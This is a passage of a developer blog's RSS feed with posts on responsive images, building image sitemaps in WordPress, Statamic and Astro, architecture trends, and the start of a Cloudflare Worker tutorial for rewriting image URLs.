&amp;lt;/picture&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The outcome is good for users. Mobile devices won’t download the larger image, saving on page load time and data transfer.&lt;/p&gt;&lt;p&gt;But using either of these approaches pretty lackluster:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;They&apos;re confusing.&lt;/strong&gt; You might&apos;ve had a different experience, but I have to re-read the documentation on responsive images every time I&apos;m about to make one. You&apos;re dealing with various attributes, media queries, multiple image paths, and descriptors you&apos;ll never use anywhere else. Nothing about it is intuitive. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;It requires too much prep.&lt;/strong&gt; Before you write any code, you need to determine the breakpoints you&apos;ll support, and then work out a process for generating multiple sizes of the same image (my example shows two versions, but you could go beyond that if you&apos;d really like to optimize for different screen sizes). There are platforms and tools that abstract a lot of that work away from you, but relying on another party just to leverage an API is a possible signal that the API sucks to begin with.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;There are collateral costs. &lt;/strong&gt;Resizing images will cost someone&apos;s time, even if it&apos;s setting up an automated process, and it&apos;s not free to host all those extra images &lt;em&gt;somewhere&lt;/em&gt;. The cost probably won&apos;t be debilitating, but it&apos;s more than zero. And I&apos;d rather be spending that money on something important, like Costco kimchi.&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;A Lighter Future&lt;/h2&gt;&lt;p&gt;Fortunately, responsive images will continue to see diminishing returns as times goes on. Modern formats like WebP and AVIF are exploding in adoption, making the weight difference between mobile &amp;amp; desktop images less drastic. &lt;/p&gt;&lt;p&gt;Take that 2,000px from earlier. At it&apos;s original size, it weighs about ~144kb. But after converting it to AVIF at a quality level virtually indistinguishable from the original, you can get it down to about ~20kb without &lt;strong&gt;changing its dimensions. &lt;/strong&gt;&lt;/p&gt;&lt;p&gt;With this kind of savings, taking on the work of resizing images, storing them, and writing weird markup just isn&apos;t worthwhile. Stick with that single image and you&apos;re golden.&lt;/p&gt;&lt;p&gt;In fairness: performance isn&apos;t the only value proposition offered by responsive images. They&apos;re useful for artistic reasons too (maybe you want a completely different image to appear only on mobile devices). Plus, the &lt;code&gt;&amp;lt;picture&amp;gt;&lt;/code&gt; is handy for falling back to older formats if a browser doesn&apos;t support a modern one. &lt;/p&gt;&lt;p&gt;But outside of those use cases, I&apos;d love to &lt;em&gt;not&lt;/em&gt; have to reach for these tools more often. And thankfully, it seems to be there&apos;s a good chance I&apos;ll be getting my way. Especially if every one of you tries out &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;.&lt;/p&gt;</content:encoded></item><item><title>You Might Consider Using an Image Sitemap</title><link>https://macarthur.me/posts/image-sitemaps</link><guid isPermaLink="true">https://macarthur.me/posts/image-sitemaps</guid><pubDate>Thu, 04 Apr 2024 01:44:05 GMT</pubDate><content:encoded>&lt;p&gt;Despite not being &lt;em&gt;strictly&lt;/em&gt; necessary for every site, sitemaps are still an important piece of a solid SEO game, allowing search engines to crawl &amp;amp; index your website’s content &lt;a href=&quot;https://www.semrush.com/blog/xml-sitemap/?ref=cms.macarthur.me&quot;&gt;&lt;a href=&quot;https://developers.google.com/search/docs/crawling-indexing/sitemaps/overview?ref=cms.macarthur.me&quot;&gt;more quickly and thoroughly&lt;/a&gt;&lt;/a&gt; (especially if your site is large, new, or poorly linked).&lt;/p&gt;&lt;p&gt;But they’re not just useful for text content. &lt;em&gt;Image&lt;/em&gt; sitemaps serve a similar purpose, specifically geared toward images (obvi). You&apos;ve very likely accessed content made discoverable through one of them. If you&apos;ve ever used Google Images, for example, an image sitemap might deserve some credit.&lt;/p&gt;&lt;h2&gt;Who Needs Them?&lt;/h2&gt;&lt;p&gt;Search engines can crawl images just fine via &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tags in your HTML (in fact, most of the sites I&apos;ve been perusing &lt;em&gt;don&apos;t&lt;/em&gt; have one). &lt;strong&gt;But if imagery is a core content type on your website, it’s probably a good idea to set one up.&lt;/strong&gt; I&apos;m thinking of sites in categories like these: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;family, &amp;amp; portrait photography&lt;/li&gt;&lt;li&gt;e-commerce&lt;/li&gt;&lt;li&gt;stock photography&lt;/li&gt;&lt;li&gt;art/illustration&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;But even aside from that, you might benefit from an image sitemap if you’re rendering images with client-side JavaScript or single-page application. Opting out of server-rendered HTML makes it more slower and more difficult for Google to index this content (although &lt;a href=&quot;https://developers.google.com/search/docs/crawling-indexing/javascript/javascript-seo-basics?ref=cms.macarthur.me&quot;&gt;they allegedly do so&lt;/a&gt;), so it&apos;s in your best interest to explicitly serve them to Google.&lt;/p&gt;&lt;h2&gt;How to Create an Image Sitemap&lt;/h2&gt;&lt;p&gt;The structure of an image sitemap is simple — a list of page URLs with images nested beneath each. Generating one requires you to know where the images in your content live, and then spitting out some XML. Here&apos;s how that structure looks: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;urlset xmlns=&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;
    xmlns:image=&quot;http://www.google.com/schemas/sitemap-image/1.1&quot;&amp;gt;
  &amp;lt;url&amp;gt;
    &amp;lt;loc&amp;gt;https://ur-site.com/first&amp;lt;/loc&amp;gt;
    &amp;lt;image:image&amp;gt;
      &amp;lt;image:loc&amp;gt;https://ur-site.com/img1.jpeg&amp;lt;/image:loc&amp;gt;
    &amp;lt;/image:image&amp;gt;
    &amp;lt;image:image&amp;gt;
      &amp;lt;image:loc&amp;gt;https://ur-site.com/img2.jpeg&amp;lt;/image:loc&amp;gt;
    &amp;lt;/image:image&amp;gt;
  &amp;lt;/url&amp;gt;
  &amp;lt;url&amp;gt;
    &amp;lt;loc&amp;gt;https://ur-site.com/second&amp;lt;/loc&amp;gt;
    &amp;lt;image:image&amp;gt;
      &amp;lt;image:loc&amp;gt;https://ur-site.com/img3.png&amp;lt;/image:loc&amp;gt;
    &amp;lt;/image:image&amp;gt;
  &amp;lt;/url&amp;gt;
&amp;lt;/urlset&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Serve that output with a &lt;code&gt;application/xml&lt;/code&gt; &quot;Content-Type&quot; and you have a valid image sitemap, ready for use by search engines.&lt;/p&gt;&lt;h2&gt;Doing It Programmatically&lt;/h2&gt;&lt;p&gt;Of course, if you&apos;re working with CMS of any sort and have regularly changing content, you&apos;ll want this automated. Some frameworks make it easier than others. Keep in mind: all the code you&apos;re about to see is for scrappy, demonstration purposes. So, maybe don&apos;t just slap it into your system. Or code review it.&lt;/p&gt;&lt;h3&gt;Example: WordPress&lt;/h3&gt;&lt;p&gt;With WordPress, you can generate a simple image sitemap by querying for all of the images attached to each page, and then echoing XML to the client. A rudimentary version doesn&apos;t take &lt;em&gt;that&lt;/em&gt; much code. All the following example does is loop through each published post, extract all &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tags (I was having trouble with &lt;code&gt;get_attached_media()&lt;/code&gt;), and piece together the sitemap. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php

add_action(&apos;template_redirect&apos;, function () {
    if (explode(&apos;?&apos;, $_SERVER[&apos;REQUEST_URI&apos;])[0] !== &apos;/image-sitemap&apos;) {
        return;
    }

    $posts = get_posts([
        &apos;post_type&apos; =&amp;gt; &apos;post&apos;,
        &apos;posts_per_page&apos; =&amp;gt; -1,
        &apos;post_status&apos; =&amp;gt; &apos;publish&apos;,
    ]);

    $sitemapContent = &quot;&quot;;

    foreach ($posts as $post) {
		$permalink = get_permalink($post-&amp;gt;ID);
		$document = new DOMDocument();

		libxml_use_internal_errors(true);

		$document-&amp;gt;loadHTML($post-&amp;gt;post_content);
		$images = $document-&amp;gt;getElementsByTagName(&apos;img&apos;);

		libxml_use_internal_errors(false);
		
		foreach ($images as $image) {
			$imageUrl = $image-&amp;gt;getAttribute(&apos;src&apos;);
			$sitemapContent .= &quot;&amp;lt;url&amp;gt;
                &amp;lt;loc&amp;gt;$permalink&amp;lt;/loc&amp;gt;
                &amp;lt;image:image&amp;gt;
                    &amp;lt;image:loc&amp;gt;$imageUrl&amp;lt;/image:loc&amp;gt;
                &amp;lt;/image:image&amp;gt;
            &amp;lt;/url&amp;gt;&quot;;
        }
    }

	header(&apos;Content-Type: application/xml; charset=utf-8&apos;);
	echo &quot;&amp;lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&amp;gt;
			&amp;lt;urlset
				xmlns=&apos;http://www.sitemaps.org/schemas/sitemap/0.9&apos;
				xmlns:image=&apos;http://www.google.com/schemas/sitemap-image/1.1&apos;
			&amp;gt;$sitemapContent&amp;lt;/urlset&amp;gt;&quot;;
	die();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With that in your theme (or wrapped up in plugin), an image sitemap would live at &lt;code&gt;https://ur-site.com/image-sitemap&lt;/code&gt; without any other admin work. Just run with it.&lt;/p&gt;&lt;h3&gt;Example: Statamic&lt;/h3&gt;&lt;p&gt;If you&apos;re working with something like Statamic, it feels a little more elegant. Query for published posts, identify the images, and ship it.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php

use Illuminate\Support\Facades\Route;
use Statamic\Facades\Entry;

Route::get(&apos;/image-sitemap&apos;, function () {
    $entries = Entry::query()
		-&amp;gt;where(&apos;collection&apos;, &apos;posts&apos;)
		-&amp;gt;where(&apos;published&apos;, true)
		-&amp;gt;limit(5)
		-&amp;gt;get();

	$sitemapContent = $entries-&amp;gt;reduce(function ($carry, $entry) {
		$document = new DOMDocument();
		$document-&amp;gt;loadHTML($entry-&amp;gt;content);

		return $carry . collect($document-&amp;gt;getElementsByTagName(&apos;img&apos;))-&amp;gt;reduce(function ($carry, $image) use ($entry) {
			$imageUrl = $image-&amp;gt;getAttribute(&apos;src&apos;);

			return $carry . &quot;&amp;lt;url&amp;gt;
                &amp;lt;loc&amp;gt;https://ur-site.com/posts/{$entry-&amp;gt;slug}&amp;lt;/loc&amp;gt;
                &amp;lt;image:image&amp;gt;
                    &amp;lt;image:loc&amp;gt;$imageUrl&amp;lt;/image:loc&amp;gt;
                &amp;lt;/image:image&amp;gt;
            &amp;lt;/url&amp;gt;&quot;;
        }, &apos;&apos;);
    }, &apos;&apos;);

    return response(&quot;&amp;lt;urlset xmlns=&apos;http://www.sitemaps.org/schemas/sitemap/0.9&apos;
        xmlns:image=&apos;http://www.google.com/schemas/sitemap-image/1.1&apos;&amp;gt;
        $sitemapContent
    &amp;lt;/urlset&amp;gt;&quot;)-&amp;gt;header(&apos;Content-Type&apos;, &apos;application/xml&apos;);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The biggest reason I&apos;m including that example, by the way, is because I&apos;ve been dabbling in the framework and really like it.&lt;/p&gt;&lt;h3&gt;Example: Astro&lt;/h3&gt;&lt;p&gt;The framework I build my own sites on, Astro, makes it easy enough as well using a custom endpoint. Create a &lt;code&gt;pages/image-sitemap.xml.js&lt;/code&gt; file, and from there on, it&apos;s a similar story: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { getCollection } from &quot;astro:content&quot;;

export async function GET(context) {
  const posts = await getCollection(&quot;blog&quot;);

  const sitemapContent = posts.reduce((acc, post) =&amp;gt; {
    const images = posts
    	.map((post) =&amp;gt; {
			const images = post.body.match(/!\[.*?\]\((.*?)\)/g);

			return images?.map((image) =&amp;gt; image.match(/\((.*?)\)/)[1]) || [];
      })
		.flat()
		.map((image) =&amp;gt; {
			// If the image is a relative path, prepend the site URL.
			if (image.startsWith(&quot;/&quot;)) {
				return image.replace(&quot;/&quot;, &quot;https://ur-site.com/&quot;);
			}

			return image;
		});

    return `${acc}
		&amp;lt;url&amp;gt;
			&amp;lt;loc&amp;gt;https://ur-site.com/${post.slug}&amp;lt;/loc&amp;gt;
			${images.reduce((acc, image) =&amp;gt; {
				return `${acc}
				&amp;lt;image:image&amp;gt;
					&amp;lt;image:loc&amp;gt;${image}&amp;lt;/image:loc&amp;gt;
				&amp;lt;/image:image&amp;gt;
				`;
			}, &quot;&quot;)}
		&amp;lt;/url&amp;gt;`;
  }, &quot;&quot;);

  return new Response(
	`&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
	&amp;lt;urlset
		xmlns=&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;
		xmlns:image=&quot;http://www.google.com/schemas/sitemap-image/1.1&quot;
	&amp;gt;
		${sitemapContent}
	&amp;lt;/urlset&amp;gt;`,
	{
		headers: {
			&quot;Content-Type&quot;: &quot;application/xml&quot;,
		},
	});
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Of course, this example assumes your posts are written in Markdown. If you&apos;re using any sort of headless solution, you&apos;d likely want to reach for an HTML parsing solution like earlier (JSDOM will do the job just fine).&lt;/p&gt;&lt;h3&gt;Or, to make it even easier...&lt;/h3&gt;&lt;p&gt;If you don&apos;t want to expend the time and mental energy building an image sitemap yourself, there&apos;s another option: let &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt; do it for you. As it&apos;s optimizing &amp;amp; caching the bananas out of your images, it&apos;ll be constantly building a dynamically updated image sitemap. &lt;/p&gt;&lt;p&gt;If you go this route, there are two steps:&lt;/p&gt;&lt;p&gt;First, tag your image URLs with an &lt;code&gt;sitemap_path&lt;/code&gt; query parameter, with the value bring the current page path:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img alt=&quot;me&quot; src=&quot;https://ur-site.com/my-image.jpg?sitemap_path=/about&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;a href=&quot;https://picperf.io/docs/wordpress?ref=cms.macarthur.me&quot;&gt;WordPress&lt;/a&gt;, &lt;a href=&quot;https://picperf.io/docs/statamic?ref=cms.macarthur.me&quot;&gt;Statamic&lt;/a&gt;, and &lt;a href=&quot;https://picperf.io/docs/astro?ref=cms.macarthur.me&quot;&gt;Astro&lt;/a&gt; integrations will also handle this for you. &lt;/p&gt;&lt;p&gt;Second, proxy that sitemap through your own domain (Google won&apos;t accept sitemaps that live on non-verified domains). Depending on how your site is built, &lt;a href=&quot;https://picperf.io/docs/sitemap/endpoint?ref=cms.macarthur.me&quot;&gt;there are several approaches&lt;/a&gt; to this that aren&apos;t complicated. And eventually, integrations will set it it all up on your site automatically.&lt;/p&gt;&lt;h2&gt;Wiring Up Your Sitemap&lt;/h2&gt;&lt;p&gt;Once that endpoint is live, you&apos;ve got two remaining tasks:&lt;/p&gt;&lt;p&gt;First, you&apos;ll need to reference it in your &lt;code&gt;robots.txt&lt;/code&gt; file. It&apos;s very simple bit of content, and even supports pointing to multiple sitemaps: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;User-agent: *
Allow: /

Sitemap: https://ur-site.com./page-sitemap.xml
Sitemap: https://ur-site.com./image-sitemap.xml&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You &lt;em&gt;could&lt;/em&gt; go the route of using a &lt;code&gt;&amp;lt;link rel=&quot;sitemap&quot;&amp;gt;&lt;/code&gt; tag in your HTML, but using the &lt;code&gt;robots.txt&lt;/code&gt; file is the most widely used convention, and probably the safer bet if you want maximum compatibility with web crawlers (that said, it likely wouldn&apos;t hurt to use &lt;em&gt;both&lt;/em&gt; approaches).&lt;/p&gt;&lt;p&gt;Finally, add it to Google Search Console. Providing the sitemap URL to Google directly is useful for catching validation errors, and it gives you some insight into the &lt;a href=&quot;https://developers.google.com/search/docs/crawling-indexing/sitemaps/build-sitemap?ref=cms.macarthur.me&quot;&gt;indexing performance&lt;/a&gt; of the sitemaps you submit.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/04/image.png&quot; alt=&quot;submitted sitemap in the Google Search Console&quot; loading=&quot;lazy&quot; width=&quot;1858&quot; height=&quot;470&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/04/image.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/04/image.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/04/image.png 1600w, https://cms.macarthur.me/content/images/2024/04/image.png 1858w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Even though it&apos;ll be accessible to crawlers via your &lt;code&gt;robots.txt&lt;/code&gt; file, submitting it directly to Google should also help expedite its indexing, giving that &lt;a href=&quot;https://developers.google.com/search/docs/crawling-indexing/sitemaps/build-sitemap?ref=cms.macarthur.me#addsitemap&quot;&gt;extra &quot;hint&quot;&lt;/a&gt; in accessing as much of your site&apos;s content as possible.&lt;/p&gt;&lt;h2&gt;Turn Over Every Stone&lt;/h2&gt;&lt;p&gt;Google and other engines are &lt;em&gt;really good&lt;/em&gt; at finding, crawling, and indexing content. Even if you run an image-centric site and totally disregard everything you see here, you have little reason to lose any sleep.&lt;/p&gt;&lt;p&gt;But enabling engines to crawl any your content isn&apos;t really the final aim of a sitemap. It&apos;s about giving engines that &lt;strong&gt;extra bit of intentional clarity&lt;/strong&gt; into what&apos;s available and should be crawled. It allows you to leave no doubt that your content will be seen; to proactively serve these entities rather than waiting around for them to get to you. &lt;/p&gt;&lt;p&gt;I can&apos;t promise it&apos;ll be a game-changer for your SEO strategy, but at least you&apos;ll leave one less stone unturned.&lt;/p&gt;</content:encoded></item><item><title>The Architecture Might Not Be the Problem</title><link>https://macarthur.me/posts/architecture</link><guid isPermaLink="true">https://macarthur.me/posts/architecture</guid><pubDate>Thu, 14 Mar 2024 00:18:26 GMT</pubDate><content:encoded>&lt;p&gt;It’s interesting how language around service architecture changes as patterns fall in &amp;amp; out of favor.&lt;/p&gt;&lt;p&gt;People who advocated for microservices years ago now refer to them as “nano” services. It seems to get at the costly hassle it can be to integrate with, iterate on, and maintain a service with such a narrow purpose. Something “nano” is annoyingly small, whereas something “micro” is just the product of good design.&lt;/p&gt;&lt;p&gt;On the other hand, “monolith” was becoming an engineering slur. It was less than a pattern; more of a digital junk drawer. You only used the word if you were disparaging a system written by engineers who came before you.&lt;/p&gt;&lt;p&gt;But now, you hear more talk of “modular” monoliths — a more palatable way to describe a similar architectural ethos, but in a way that distances yourself from the poor implementations of the past.&lt;/p&gt;&lt;p&gt;At the same time, the monolithic legend Ruby on Rails is seeing a resurgence as &lt;a href=&quot;https://x.com/shpigford/status/1753188910304301260?s=46&amp;amp;t=FEoZuTaNl0-_kWsXTwXrXQ&amp;amp;ref=cms.macarthur.me&quot;&gt;teams are reeling with the tradeoffs&lt;/a&gt; of more tumultuous architectures, and Laravel continues to explode, even catching notable attention from &lt;a href=&quot;https://youtu.be/Spwv0RbITmE?si=fgibQyhuwJ26TUw8&amp;amp;ref=cms.macarthur.me&quot;&gt;other communities&lt;/a&gt; (despite PHP being dead — incredible).&lt;/p&gt;&lt;p&gt;Regardless of what architectural trends look like at a given moment, the language around them attempts to get at the same thing: &lt;strong&gt;how well-suited an architecture is to meet a need.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;But being how consistently inconsistent they are, I wonder if the underlying patterns we use are as critical to an effective system as much as we seem to think.&lt;/p&gt;&lt;h2&gt;An Imagined Scenario&lt;/h2&gt;&lt;p&gt;I’m not old or wise enough to definitively know why these shifts occur like clockwork every few years, but it&apos;s fun to speculate. Let’s imagine:&lt;/p&gt;&lt;p&gt;You’re on a team that owns a monolithic service. It’s relatively new, but given a little time, the system starts to show its cracks. They’re not a problem at first; easy enough to walk over without really noticing. Maybe it’s the occasional bug dismissed as an edge case. Or perhaps a small change that took too long to ship, but that was shrugged off because you have new engineers who are just unfamiliar with the codebase. Nothing&apos;s on fire and there&apos;s no negative impact to business or productivity. Stuff like this just happens (and really, it does).&lt;/p&gt;&lt;p&gt;But eventually, those cracks swell. It&apos;s harder to walk, and your team finds itself outright tripping more frequently. The stumbles are mostly just annoying, but quickly enough, crippling. The pipeline is consistently blocked, and you’re playing Whack-a-Bug every time you do get around to shipping something (which seems to rarely happen nowadays anyway).&lt;/p&gt;&lt;p&gt;It’s clear that you can no longer afford to work with the status quo. So, you take inventory of the pain. Some of it can be eased with operational tweaks, but a long-term fix needs to go deeper. You want to get at the root of the problem. Uprooting the tree altogether certainly does that (sorry for switching metaphors here).&lt;/p&gt;&lt;p&gt;But you’re not naïve. You know that the old system was, at one point, built from scratch too. So, you’ll do it &lt;em&gt;differently&lt;/em&gt;. And conveniently, the biggest pain points can be neatly grouped under a single heading: the architecture.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;em&gt;The pipeline&apos;s always clogged because teams are competing for stage time in a single monolithic application!&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;em&gt;Bugs keep popping up because there&apos;s so much intertwined code shoved into a monolithic application!&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;em&gt;It takes so long to build a feature because there&apos;s a different convention used in every corner of this monolithic application!&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The core problem &lt;em&gt;seems&lt;/em&gt; obvious, despite &lt;a href=&quot;https://en.wikipedia.org/wiki/Streetlight_effect?ref=cms.macarthur.me&quot;&gt;only really looking where the light is&lt;/a&gt;. And the solution is to adopt a well-organized, scalable, &lt;em&gt;microservice&lt;/em&gt; architecture. And so, you&apos;re off to build it a better way, free of the baggage of the past, and filled with a renewed sense of confidence.&lt;/p&gt;&lt;h2&gt;Same Story, Different Pattern&lt;/h2&gt;&lt;p&gt;We know how the story goes from here. The cycle continues, and some version of the same story repeats itself, just with new characters on a different stage.&lt;/p&gt;&lt;p&gt;Bob Martin touches on this cycle in &lt;a href=&quot;https://www.amazon.com/Clean-Architecture-Craftsmans-Software-Structure/dp/0134494164?ref=cms.macarthur.me&quot;&gt;Clean Architecture&lt;/a&gt;: &quot;The same overconfidence that led to the mess is now telling them that they can build it better if they can start the race over.&quot; Been there, by the way. Many, many times.&lt;/p&gt;&lt;p&gt;In fairness, blowing it up and pivoting to a new architecture &lt;em&gt;might be a legitimately good decision&lt;/em&gt;. But it&apos;s a costly one, and it risks overlooking more subtle, meaningful problems we didn’t (want to) identify when the pain was fresh. A few come to mind: poor testing habits, squishy pattern standards, siloed relationships between stakeholders and engineers, uninvested team members, an otherwise unhealthy engineering culture, etc. Some of these are pretty boring, but they’ll cause a system to rot no matter how immaculate the architectural vision is.&lt;/p&gt;&lt;p&gt;All that said, think of this as another reminder of how important it is to be really clear on what it is we’re trying to solve, and why we think massive undertakings (like an architectural migration) have a realistic chance of helping. And when you hear that case being made, consider it your responsibility to press into it. Ask questions. Question assumptions. Leave no doubt that there aren’t other avenues more appropriate to explore, at least first.&lt;/p&gt;&lt;p&gt;It could end up being the right move. But at least not because we’re just eager to ride the pendulum as it swings to the other side (sorry, another metaphor).&lt;/p&gt;</content:encoded></item><item><title>Transform Image URLs with a Simple Cloudflare Worker</title><link>https://macarthur.me/posts/transform-images</link><guid isPermaLink="true">https://macarthur.me/posts/transform-images</guid><pubDate>Sun, 25 Feb 2024 01:02:50 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been working on &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt; in some capacity for about a year now, and I&apos;m still really happy with its API for optimizing, reformatting, and caching images: prefix the URLs with &lt;code&gt;https://picperf.io&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;But on a number of platforms, that&apos;s not so simple. Images are often handled by a proprietary system, with no means of changing those URLs. That&apos;s unfortunate because many of those platforms don&apos;t have a sophisticated optimization pipeline built out. &lt;a href=&quot;https://support.squarespace.com/hc/en-us/articles/205812748-Image-and-file-URLs-in-Squarespace?ref=cms.macarthur.me&quot;&gt;Squarespace, for example&lt;/a&gt;, will auto-generate sizes, but won&apos;t convert images to more optimal formats like WebP or AVIF. Others might, but they&apos;ll set underwhelming cache headers, which isn&apos;t great for repeat visitors.&lt;/p&gt;&lt;p&gt;This is exactly the kind of problem best solved by a Cloudflare Worker. We can transform HTML (like images tags) on the fly, at the edge, and with no dependencies. And all in ~60 lines of code. Oh, and entirely on Cloudflare&apos;s free tier. &lt;/p&gt;&lt;p&gt;Let&apos;s walk through it.&lt;/p&gt;&lt;h2&gt;Getting Set Up&lt;/h2&gt;&lt;p&gt;To get started, you&apos;ll need an active zone set up for your domain. The most common (and easiest) way to do that is to have Cloudflare fully manage your DNS (it&apos;s free). Then, just make sure the &quot;proxied&quot; toggle is enabled. &lt;/p&gt;&lt;p&gt;I&apos;ll be using a subdomain for demonstration. It points to a single &lt;code&gt;index.html&lt;/code&gt; file hosted with Vercel, but it&apos;ll work with any other platform you&apos;re using too. Vercel enables custom domain usage via CNAME, so my DNS record looks like this:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image.png&quot; alt=&quot;demo DNS record with &amp;quot;proxied&amp;quot; enabled&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;309&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/02/image.png 1600w, https://cms.macarthur.me/content/images/2024/02/image.png 2188w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Here&apos;s that HTML. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
	&amp;lt;head&amp;gt;
		&amp;lt;title&amp;gt;Example Site&amp;lt;/title&amp;gt;
		&amp;lt;style&amp;gt;
			#otherBlock {
				background: url(https://macarthur.me/me.jpg); 
				height: 300px; 
				width: 300px;
			}
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
	&amp;lt;img src=&quot;https://macarthur.me/me.jpg&quot; alt=&quot;me&quot;&amp;gt;
	&amp;lt;div style=&quot;background: url(https://macarthur.me/me.jpg); height: 200px; width: 200px;&quot;&amp;gt;&amp;lt;/div&amp;gt;
	&amp;lt;div id=&quot;otherBlock&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s simple, but it&apos;s all we need to verify both image elements and CSS background images are handled correctly. &lt;/p&gt;&lt;h2&gt;Creating a New Worker&lt;/h2&gt;&lt;p&gt;Let&apos;s now create that worker. At the top level of your Cloudflare account, find the &quot;Workers &amp;amp; Pages&quot; link on the left sidebar, click &quot;Create Application,&quot; and then the &quot;Create Worker&quot; button. If you did things right, you&apos;ll land on a page containing a basic, starter worker: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image-1.png&quot; alt=&quot;basic starter worker&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;1231&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image-1.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image-1.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/02/image-1.png 1600w, https://cms.macarthur.me/content/images/2024/02/image-1.png 2122w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Leave it as it is and deploy it for now. You&apos;ll see a preview link, and when it&apos;s clicked, you should see &quot;Hello World!&quot; rendered to the screen.&lt;/p&gt;&lt;h2&gt;Intercepting Requests&lt;/h2&gt;&lt;p&gt;Next up, let&apos;s make our worker sit in front of every request to our site, so it can eventually modify its HTML. We&apos;ll use a &lt;a href=&quot;https://developers.cloudflare.com/workers/configuration/routing/routes/?ref=cms.macarthur.me&quot;&gt;route rule&lt;/a&gt; to do this.&lt;/p&gt;&lt;p&gt;Navigate to your worker&apos;s overview and select the &quot;Triggers&quot; menu item. If you scroll down to &quot;Routes,&quot; you&apos;ll see your newly created worker: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image-2.png&quot; alt=&quot;the routes for a newly created Cloudflare worker&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;363&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image-2.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/02/image-2.png 1600w, https://cms.macarthur.me/content/images/size/w2400/2024/02/image-2.png 2400w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Add a new route that uses wildcards to cover every request path that might hit the domain you&apos;re targeting. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/02/image-3.png&quot; alt=&quot;worker route configuration&quot; loading=&quot;lazy&quot; width=&quot;1744&quot; height=&quot;610&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/02/image-3.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/02/image-3.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/02/image-3.png 1600w, https://cms.macarthur.me/content/images/2024/02/image-3.png 1744w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;With those wildcards in place, it&apos;ll match on every request, allowing us to always intercept &amp;amp; manipulate HTML like we intend.&lt;/p&gt;&lt;h2&gt;Handling Incoming Requests&lt;/h2&gt;&lt;p&gt;This is where things get fun. The code in our worker just spits back a dumb &lt;code&gt;Response&lt;/code&gt;. Let&apos;s start upgrading it by returning the HTML that would&apos;ve been returned without our worker. &lt;/p&gt;&lt;p&gt;We&apos;ll be doing all these changes in the browser. Find the &quot;Quick 